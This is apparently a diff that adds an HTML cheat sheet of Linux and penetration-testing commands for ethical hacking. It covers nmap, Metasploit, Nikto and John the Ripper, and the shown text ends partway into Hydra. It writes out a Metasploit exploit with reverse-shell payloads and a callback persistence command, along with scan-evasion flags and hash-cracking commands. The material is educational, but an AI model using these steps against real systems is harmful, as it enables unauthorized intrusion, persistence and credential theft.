@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Tools for Ethical Hacking and Cybersecurity</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #536a81;
+            --secondary-color: #31ad00;
+            --tertiary-color: #3498db;
+            --bg-color: #050505;
+            --text-color: #34495e;
+            --card-bg: #242222;
+            --code-bg: #f7f9fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            overflow-x: hidden;
+            box-shadow: 0 10px 20px rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 30px rgba(255, 255, 255, 0.2);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--card-bg);
+            padding: 40px 0;
+            text-align: center;
+            clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
+            margin-bottom: 60px;
+        }
+
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .subtitle {
+            font-size: 1.2em;
+            opacity: 0.8;
+        }
+
+        .section {
+            margin-bottom: 60px;
+        }
+
+        h2 {
+            color: var(--secondary-color);
+            font-size: 2em;
+            margin-bottom: 30px;
+            position: relative;
+            display: inline-block;
+        }
+
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 50%;
+            height: 3px;
+            background-color: var(--tertiary-color);
+            transition: width 0.3s ease;
+        }
+
+        h2:hover::after {
+            width: 100%;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .tool {
+            background-color: var(--card-bg);
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* .tool::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, var(--tertiary-color) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        } */
+
+        .tool:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .tool:hover::before {
+            opacity: 0.1;
+        }
+
+        .tool h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .tool h3 i {
+            margin-right: 10px;
+            color: var(--secondary-color);
+            font-size: 1.5em;
+            transition: transform 0.3s ease;
+        }
+
+        .tool:hover h3 i {
+            transform: rotate(360deg);
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            border-left: 3px solid var(--secondary-color);
+            padding: 15px;
+            overflow-x: auto;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            color: var(--tertiary-color);
+        }
+
+        .example {
+            font-style: italic;
+            color: #7f8c8d;
+            margin: 10px 0;
+        }
+
+        ul {
+            list-style-type: none;
+            padding-left: 20px;
+        }
+
+        ul li {
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        ul li::before {
+            content: "\f105";
+            font-family: 'Font Awesome 5 Free';
+            font-weight: 900;
+            color: var(--secondary-color);
+            position: absolute;
+            left: -20px;
+            transition: transform 0.3s ease;
+        }
+
+        ul li:hover::before {
+            transform: translateX(5px);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            .tool {
+                padding: 20px;
+            }
+        }
+
+        /* Dark mode toggle */
+
+        .dark-mode-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--primary-color);
+            color: var(--card-bg);
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 1.5em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .dark-mode-toggle:hover {
+            background-color: var(--secondary-color);
+        }
+
+        /* Dark mode styles */
+
+        body.dark-mode {
+            --bg-color: #1a1a1a;
+            --text-color: #f0f0f0;
+            --card-bg: #2c2c2c;
+            --code-bg: #3a3a3a;
+        }
+
+        body.dark-mode .tool {
+            box-shadow: 0 10px 20px rgba(255, 255, 255, 0.1);
+        }
+
+        body.dark-mode .tool:hover {
+            box-shadow: 0 15px 30px rgba(255, 255, 255, 0.2);
+        }
+    </style>
+</head>
+
+<body>
+    <button class="dark-mode-toggle" id="darkModeToggle">
+        <i class="fas fa-moon"></i>
+    </button>
+
+    <header>
+        <div class="container">
+            <h1><i class="fas fa-terminal"></i> Linux: The Hacker's Toolkit</h1>
+            <p class="subtitle">Master the command-line for ethical hacking and cybersecurity</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <section class="section">
+            <h2><i class="fas fa-folder"></i> File System and Navigation</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-list"></i> ls (List Directory Contents)</h3>
+                    <p>Lists files and directories in the current directory.</p>
+                    <p class="example">Example: <code>ls -lah</code></p>
+                    <p>Shows a detailed view with hidden files in human-readable format.</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-folder"></i> cd (Change Directory)</h3>
+                    <p>Used to change the working directory.</p>
+                    <p class="example">Example: <code>cd /home/user/Documents</code></p>
+                    <p>Moves you to the "Documents" directory.</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-map-marker-alt"></i> pwd (Print Working Directory)</h3>
+                    <p>Displays the current directory you are working in.</p>
+                    <p class="example">Example: <code>pwd</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-copy"></i> cp (Copy Files/Directories)</h3>
+                    <p>Copies files from one location to another.</p>
+                    <p class="example">Example: <code>cp file.txt /home/user/Backup/</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-arrow-right"></i> mv (Move or Rename Files/Directories)</h3>
+                    <p>Moves or renames files and directories.</p>
+                    <p class="example">Example: <code>mv file.txt /home/user/Documents/</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-trash"></i> rm (Remove Files/Directories)</h3>
+                    <p>Removes files or directories.</p>
+                    <p class="example">Example: <code>rm -rf /home/user/OldFiles</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-lock"></i> Permissions and Ownership</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-key"></i> chmod (Change File Permissions)</h3>
+                    <p>Modifies file permissions for the owner, group, and others.</p>
+                    <p class="example">Example: <code>chmod +x script.sh</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-user-edit"></i> chown (Change File Ownership)</h3>
+                    <p>Changes the ownership of a file or directory.</p>
+                    <p class="example">Example: <code>chown user:group file.sh</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-network-wired"></i> Networking Utilities</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-globe"></i> ifconfig (Configure Network Interfaces)</h3>
+                    <p>Displays or configures network interface parameters.</p>
+                    <p class="example">Example: <code>ifconfig eth0</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-link"></i> ping (Check Network Connectivity)</h3>
+                    <p>Pings a target IP or hostname to test network connectivity.</p>
+                    <p class="example">Example: <code>ping 8.8.8.8</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-chart-line"></i> netstat (Network Statistics)</h3>
+                    <p>Displays network connections, routing tables, and interface statistics.</p>
+                    <p class="example">Example: <code>netstat -anp</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-route"></i> traceroute (Network Path Trace)</h3>
+                    <p>Traces the route packets take to a network host.</p>
+                    <p class="example">Example: <code>traceroute google.com</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-desktop"></i> System Monitoring and Process Management</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-tasks"></i> top (Real-Time System Monitoring)</h3>
+                    <p>Displays running processes, CPU, and memory usage.</p>
+                    <p class="example">Example: <code>top</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-info-circle"></i> ps (Process Status)</h3>
+                    <p>Displays information about running processes.</p>
+                    <p class="example">Example: <code>ps aux</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-ban"></i> kill (Terminate Processes)</h3>
+                    <p>Sends a signal to terminate a process.</p>
+                    <p class="example">Example: <code>kill -9 PID</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-file-alt"></i> Text Manipulation</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-search"></i> grep (Search Text)</h3>
+                    <p>Searches for patterns within files.</p>
+                    <p class="example">Example: <code>grep "error" logfile.txt</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-code"></i> awk (Pattern Scanning and Processing)</h3>
+                    <p>Used for pattern-based data extraction and reporting.</p>
+                    <p class="example">Example: <code>awk '{print $1, $3}' logfile.txt</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-exchange-alt"></i> sed (Stream Editor)</h3>
+                    <p>Used to perform basic text transformations.</p>
+                    <p class="example">Example: <code>sed 's/error/success/g' logfile.txt</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-robot"></i> Automation and Scripting</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-terminal"></i> Bash Scripting</h3>
+                    <p>Automates tasks by combining multiple Linux commands into scripts.</p>
+                    <p class="example">Example:
+                        <pre><code>
+        #!/bin/bash
+        for ip in $(cat ips.txt); do
+          ping -c 1 $ip && echo "$ip is up" || echo "$ip is down"
+        done
+                        </code></pre>
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-lightbulb"></i> Pro-Level Tips and Shortcuts</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-keyboard"></i> Use alias for Shortcuts</h3>
+                    <p>Create shortcuts for common commands.</p>
+                    <p class="example">Example: <code>alias ll='ls -lah'</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-random"></i> Redirection & Piping</h3>
+                    <p>Redirect output to files or use pipes to pass the output of one command as input to another.</p>
+                    <p class="example">Example: <code>grep "error" logfile.txt | tee errors.txt</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-user-shield"></i> Run Commands as Root</h3>
+                    <p>Use <code>sudo</code> to execute commands as the root user.</p>
+                    <p class="example">Example: <code>sudo apt-get update</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-window-restore"></i> Use screen or tmux</h3>
+                    <p>These tools allow you to run long tasks in the background or maintain sessions even after disconnecting.</p>
+                    <p class="example">Example: <code>screen -S mysession</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-network-wired"></i> Nmap: The Network Mapper</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-search"></i> Basic Scanning</h3>
+                    <p>Nmap is used to scan a target for open ports and services.</p>
+                    <p class="example">Example: <code>nmap 192.168.1.1</code></p>
+                    <p>Scan multiple hosts: <code>nmap 192.168.1.1 192.168.1.2</code></p>
+                    <p>Scan a range of IPs: <code>nmap 192.168.1.1-254</code></p>
+                    <p>Scan an entire subnet: <code>nmap 192.168.1.0/24</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-plug"></i> Port Scanning</h3>
+                    <p>Identifying open ports on a target.</p>
+                    <p class="example">Scan specific ports: <code>nmap -p 22,80 192.168.1.1</code></p>
+                    <p>Scan a range of ports: <code>nmap -p 1-100 192.168.1.1</code></p>
+                    <p>Scan all ports: <code>nmap -p- 192.168.1.1</code></p>
+                    <p>UDP scan: <code>nmap -sU 192.168.1.1</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-file-alt"></i> Service and Version Detection</h3>
+                    <p>Identifies services running on open ports and their versions.</p>
+                    <p class="example">Service version detection: <code>nmap -sV 192.168.1.1</code></p>
+                    <p>Aggressive service detection: <code>nmap -A 192.168.1.1</code></p>
+                    <p>Operating system detection: <code>nmap -O 192.168.1.1</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-cogs"></i> Script Scanning (Nmap Scripting Engine - NSE)</h3>
+                    <p>Extend Nmap capabilities with scripts to detect vulnerabilities.</p>
+                    <p class="example">Run default scripts: <code>nmap -sC 192.168.1.1</code></p>
+                    <p>Run a specific script: <code>nmap --script=http-vuln-cve2017-5638 -p80 192.168.1.1</code></p>
+                    <p>Run multiple scripts: <code>nmap --script=smb-vuln-*,http-vuln-* 192.168.1.1</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-tachometer-alt"></i> Scan Timing and Performance</h3>
+                    <p>Adjust scan speed and stealth.</p>
+                    <p class="example">Fast scan: <code>nmap -T4 192.168.1.1</code></p>
+                    <p>Stealth scan (SYN): <code>nmap -sS 192.168.1.1</code></p>
+                    <p>Slow and stealthy scan: <code>nmap -T0 -sS 192.168.1.1</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-save"></i> Scan Output</h3>
+                    <p>Save scan results for later analysis or reporting.</p>
+                    <p class="example">Save to text file: <code>nmap 192.168.1.1 -oN output.txt</code></p>
+                    <p>Save in XML format: <code>nmap 192.168.1.1 -oX output.xml</code></p>
+                    <p>Save in all formats: <code>nmap 192.168.1.1 -oA output</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-shield-alt"></i> Firewall Evasion and Spoofing</h3>
+                    <p>Evade detection and spoof identity during scans.</p>
+                    <p class="example">Scan from a decoy IP: <code>nmap -D 192.168.1.10,192.168.1.11 192.168.1.1</code></p>
+                    <p>Spoof MAC address: <code>nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1</code></p>
+                    <p>Fragment packets: <code>nmap -f 192.168.1.1</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-lightbulb"></i> Pro-Level Tips</h3>
+                    <p>Maximize your Nmap skills with advanced options.</p>
+                    <p class="example">Use --reason: <code>nmap --reason 192.168.1.1</code></p>
+                    <p>Find devices behind a firewall: <code>nmap -Pn 192.168.1.1</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-terminal"></i> Metasploit Framework</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-book"></i> Basic Metasploit Terminology</h3>
+                    <p>Before diving into Metasploit commands, it’s crucial to understand its basic components:</p>
+                    <ul>
+                        <li><strong>Exploit:</strong> Code that takes advantage of a vulnerability.</li>
+                        <li><strong>Payload:</strong> The code delivered to the system after exploiting it (e.g., reverse shell).</li>
+                        <li><strong>Auxiliary:</strong> Modules for scanning, fuzzing, and information gathering.</li>
+                        <li><strong>Listeners:</strong> Metasploit can listen for incoming connections from payloads.</li>
+                        <li><strong>Meterpreter:</strong> A specialized payload that allows for powerful post-exploitation activities.</li>
+                    </ul>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-power-off"></i> Starting Metasploit</h3>
+                    <p>Start the Metasploit Console (msfconsole):</p>
+                    <p class="example">Example: <code>msfconsole</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-search"></i> Searching for Exploits</h3>
+                    <p>Search for exploits relevant to the target system or software:</p>
+                    <p class="example">Example: <code>search vsftpd</code></p>
+                    <p>Search for a specific CVE:</p>
+                    <p class="example">Example: <code>search cve:2017-0143</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-rocket"></i> Selecting and Using an Exploit</h3>
+                    <p>Load an exploit into the framework:</p>
+                    <p class="example">Example: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code></p>
+                    <p>Show available settings for the selected exploit:</p>
+                    <p class="example">Example: <code>show options</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-cogs"></i> Setting Parameters</h3>
+                    <p>Configure options like target IP and payload:</p>
+                    <p class="example">Set target IP: <code>set RHOST 192.168.1.10</code></p>
+                    <p class="example">Set target port: <code>set RPORT 21</code></p>
+                    <p class="example">Set payload: <code>set payload linux/x86/meterpreter/reverse_tcp</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-play"></i> Running the Exploit</h3>
+                    <p>Launch the exploit with the current configuration:</p>
+                    <p class="example">Example: <code>run</code> or <code>exploit</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-database"></i> Payloads and Meterpreter</h3>
+                    <p>Examples of payloads:</p>
+                    <p class="example">Reverse TCP: <code>set payload windows/meterpreter/reverse_tcp</code></p>
+                    <p class="example">Bind shell: <code>set payload windows/shell/bind_tcp</code></p>
+                    <p class="example">HTTPS payload: <code>set payload windows/meterpreter/reverse_https</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-terminal"></i> Post-Exploitation with Meterpreter</h3>
+                    <p>Basic commands after gaining a session:</p>
+                    <ul>
+                        <li><code>sysinfo</code>: Display system info.</li>
+                        <li><code>getuid</code>: Get user ID of session.</li>
+                        <li><code>shell</code>: Drop to a shell on the target system.</li>
+                        <li><code>download /path/to/file</code>: Download a file from the target.</li>
+                        <li><code>upload /path/to/file</code>: Upload a file to the target.</li>
+                    </ul>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-headset"></i> Exploit Multi-Handler</h3>
+                    <p>Use multi-handler to manage incoming payload connections:</p>
+                    <p class="example">Example: <code>use exploit/multi/handler</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-tools"></i> Auxiliary Modules</h3>
+                    <p>Run auxiliary modules for scanning or gathering info:</p>
+                    <p class="example">Example: <code>use auxiliary/scanner/smb/smb_version</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-database"></i> Database Integration</h3>
+                    <p>Store scan results and manage hosts:</p>
+                    <p class="example">Connect to DB: <code>db_connect</code></p>
+                    <p class="example">Nmap scan and store results: <code>db_nmap 192.168.1.0/24</code></p>
+                    <p class="example">View hosts: <code>hosts</code></p>
+                    <p class="example">View services: <code>services</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-user-shield"></i> Pro-Level Tips</h3>
+                    <p>Make Meterpreter sessions persistent:</p>
+                    <p class="example">Example: <code>run persistence -U -i 5 -p 4444 -r 192.168.1.5</code></p>
+                    <p>Automate post-exploitation:</p>
+                    <p class="example">Example: <code>run post/windows/gather/enum_logged_on_users</code></p>
+                </div>
+            </div>
+        </section>
+        <!--         <section class="section">
+            <h2><i class="fas fa-lightbulb"></i> Pro-Level Tips and Shortcuts</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-keyboard"></i> Use alias for Shortcuts</h3>
+                    <p>Create shortcuts for common commands.</p>
+                    <p class="example">Example: <code>alias ll='ls -lah'</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-random"></i> Redirection & Piping</h3>
+                    <p>Redirect output to files or use pipes to pass the output of one command as input to another.</p>
+                    <p class="example">Example: <code>grep "error" logfile.txt | tee errors.txt</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-user-shield"></i> Run Commands as Root</h3>
+                    <p>Use <code>sudo</code> to execute commands as the root user.</p>
+                    <p class="example">Example: <code>sudo apt-get update</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-window-restore"></i> Use screen or tmux</h3>
+                    <p>These tools allow you to run long tasks in the background or maintain sessions even after disconnecting.</p>
+                    <p class="example">Example: <code>screen -S mysession</code></p>
+                </div>
+            </div>
+        </section> -->
+
+        <section class="section">
+            <h2><i class="fas fa-globe"></i> Nikto: Web Server Scanner</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-code"></i> Basic Nikto Terminology</h3>
+                    <p>Nikto scans for well-known vulnerabilities like outdated software versions, default files, or misconfigurations. It uses plugins to extend its scanning capabilities and supports various output formats (text, HTML, XML).</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-terminal"></i> Installing Nikto</h3>
+                    <p>Nikto is pre-installed in pentesting distributions like Kali Linux. Install manually using:</p>
+                    <p class="example">Example: <code>sudo apt install nikto</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-bug"></i> Basic Scan</h3>
+                    <p>Scan a web server for vulnerabilities:</p>
+                    <p class="example">Example: <code>nikto -h http://example.com</code></p>
+                    <p class="example">Scan with SSL: <code>nikto -h https://example.com</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-network-wired"></i> Targeting Specific IPs or Ports</h3>
+                    <p>Specify the IP address or port for scanning:</p>
+                    <p class="example">Scan an IP: <code>nikto -h 192.168.1.10</code></p>
+                    <p class="example">Scan a port: <code>nikto -h 192.168.1.10 -p 8080</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-cog"></i> Tuning Scans</h3>
+                    <p>Narrow down the scan focus using tuning options:</p>
+                    <p class="example">Example: <code>nikto -h example.com -T 123</code> (Limits scan to file extensions, misconfigurations, and disclosure checks)</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-lock"></i> Using Proxies</h3>
+                    <p>Run Nikto through a proxy:</p>
+                    <p class="example">Example: <code>nikto -h http://example.com -useproxy http://proxy-ip:8080</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-plug"></i> Specifying Plugins</h3>
+                    <p>Use specific plugins for scanning:</p>
+                    <p class="example">Example: <code>nikto -h example.com -Plugins "Apache"</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-user-secret"></i> Customizing User Agent</h3>
+                    <p>Change the User-Agent in HTTP requests:</p>
+                    <p class="example">Example: <code>nikto -h example.com -useragent "Mozilla/5.0"</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-tachometer-alt"></i> Scan Rate Limiting</h3>
+                    <p>Throttle the scan rate to avoid overwhelming the server:</p>
+                    <p class="example">Example: <code>nikto -h example.com -delay 2</code> (Adds a 2-second delay between requests)</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-file-alt"></i> Output and Reporting</h3>
+                    <p>Nikto supports multiple output formats:</p>
+                    <p class="example">Text: <code>nikto -h example.com -output results.txt</code></p>
+                    <p class="example">HTML: <code>nikto -h example.com -Format html -output report.html</code></p>
+                    <p class="example">CSV: <code>nikto -h example.com -Format csv -output report.csv</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-eye"></i> Verbose Mode</h3>
+                    <p>Enable verbose output to see detailed HTTP requests and responses:</p>
+                    <p class="example">Example: <code>nikto -h example.com -v</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-shield-alt"></i> SSL/TLS Scanning</h3>
+                    <p>Scan SSL/TLS misconfigurations and vulnerabilities:</p>
+                    <p class="example">Example: <code>nikto -h https://example.com -ssl</code></p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-tasks"></i> Pro-Level Tips</h3>
+                    <p>Schedule scans with cron jobs or use proxy chains for anonymity:</p>
+                    <p class="example">Example: <code>proxychains nikto -h http://example.com</code></p>
+                </div>
+            </div>
+        </section>
+
+
+        <section class="section">
+            <h2><i class="fas fa-lightbulb"></i>John the Ripper</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-user-shield"></i> John the Ripper Overview</h3>
+                    <p>John the Ripper (often called just "John") is a fast, open-source password-cracking tool. It is widely used for testing weak passwords, recovering lost credentials, or testing password strength in cybersecurity assessments.</p>
+                    <p class="example">Example: John supports various hash types including UNIX, Windows, and web applications.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-terminal"></i> Installing John the Ripper</h3>
+                    <p>John is pre-installed in pentesting distributions like Kali Linux, but you can also manually install it.</p>
+                    <p class="example">Example: <code>sudo apt install john</code> for the standard version. Clone from GitHub for the Jumbo version: <code>git clone https://github.com/openwall/john.git</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-lock"></i> Cracking Basic Passwords</h3>
+                    <p>Use John to crack password hashes from files.</p>
+                    <p class="example">Example: <code>john --format=raw-md5 hash.txt</code> to crack an MD5 hash.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-hashtag"></i> Supported Hash Formats</h3>
+                    <p>John supports many hash formats like MD5, SHA-256, and bcrypt. Use the <code>--format</code> flag to specify the hash type.</p>
+                    <p class="example">Example: <code>john --list=formats</code> to list all supported hash formats.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-file-word"></i> Using Wordlists</h3>
+                    <p>John can perform dictionary attacks using wordlists. Specify the path to a wordlist with the <code>--wordlist</code> option.</p>
+                    <p class="example">Example: <code>john --wordlist=/path/to/wordlist.txt hash.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-keyboard"></i> Incremental Mode (Brute Force)</h3>
+                    <p>In incremental mode, John tries all possible combinations of characters to crack the password.</p>
+                    <p class="example">Example: <code>john --incremental hash.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-hourglass-start"></i> Restoring and Resuming Sessions</h3>
+                    <p>Save and resume cracking sessions.</p>
+                    <p class="example">Example: <code>john --session=my_crack hash.txt</code> to save, and <code>john --restore=my_crack</code> to resume.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-file-archive"></i> Cracking ZIP, PDF, or Other File Passwords</h3>
+                    <p>Use John to crack passwords of files like ZIP archives and PDFs.</p>
+                    <p class="example">Example: Extract ZIP hash: <code>zip2john file.zip > hash.txt</code> then crack: <code>john hash.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-windows"></i> Cracking NTLM (Windows) Hashes</h3>
+                    <p>John is also effective in cracking Windows NTLM hashes.</p>
+                    <p class="example">Example: <code>john --format=NT hash.txt</code> to crack NTLM hashes.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-code"></i> Combining Wordlist and Rules</h3>
+                    <p>Apply rules to modify passwords in the wordlist (e.g., adding numbers or symbols).</p>
+                    <p class="example">Example: <code>john --wordlist=wordlist.txt --rules hash.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-eye"></i> Showing Cracked Passwords</h3>
+                    <p>Display cracked passwords using the <code>--show</code> option.</p>
+                    <p class="example">Example: <code>john --show hash.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-key"></i> Cracking with GPUs</h3>
+                    <p>John can use GPU acceleration to speed up password cracking.</p>
+                    <p class="example">Example: <code>john --format=raw-md5-opencl hash.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-save"></i> Saving Output to a File</h3>
+                    <p>Save cracked passwords to an output file.</p>
+                    <p class="example">Example: <code>john --wordlist=wordlist.txt hash.txt --pot=output.txt</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-tasks"></i> Pro-Level Tips</h3>
+                    <ul>
+                        <li>Combine rules and brute-force mode for better results.</li>
+                        <li>Use parallel cracking by splitting hash files and running John on multiple machines.</li>
+                        <li>Utilize custom wordlists generated by tools like cewl.</li>
+                    </ul>
+                    <p class="example">Example: Use cron jobs for session automation: <code>0 3 * * * john --restore=my_crack</code></p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-lightbulb"></i> Hydra Overview</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-keyboard"></i> Basic Terminology</h3>
+                    <p>Before diving into commands, let's cover some basic terms associated with Hydra:</p>
+                    <ul>
+                        <li><strong>Brute Force Attack:</strong> Systematically guessing login credentials by trying every possible combination.</li>
+                        <li><strong>Dictionary Attack:</strong> Using a pre-built list of common passwords (wordlist) to try and guess the correct password.</li>
+                        <li><strong>Protocols:</strong> The type of service or login mechanism you're attacking (e.g., SSH, FTP).</li>
+                    </ul>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-cog"></i> Installing Hydra</h3>
+                    <p>Hydra is pre-installed in most penetration testing distributions like Kali Linux, but if you need to install it manually, follow these steps:</p>
+                    <p><strong>Installation on Debian-based systems:</strong></p>
+                    <p><code>sudo apt install hydra</code></p>
+                    <p><strong>Cloning from Source (if you want the latest version):</strong></p>
+                    <p>
+                        <code>
+                            git clone https://github.com/vanhauser-thc/thc-hydra.git<br>
+                            cd thc-hydra<br>
+                            ./configure<br>
+                            make<br>
+                            sudo make install
+                        </code>
+                    </p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-terminal"></i> General Syntax</h3>
+                    <p>Hydra's syntax follows a simple pattern:</p>
+                    <code>hydra [options] [target] [protocol]</code>
+                    <p><strong>Options:</strong> Flags to define the mode of attack, such as username, password, or wordlists.</p>
+                    <p><strong>Target:</strong> The target IP address or hostname.</p>
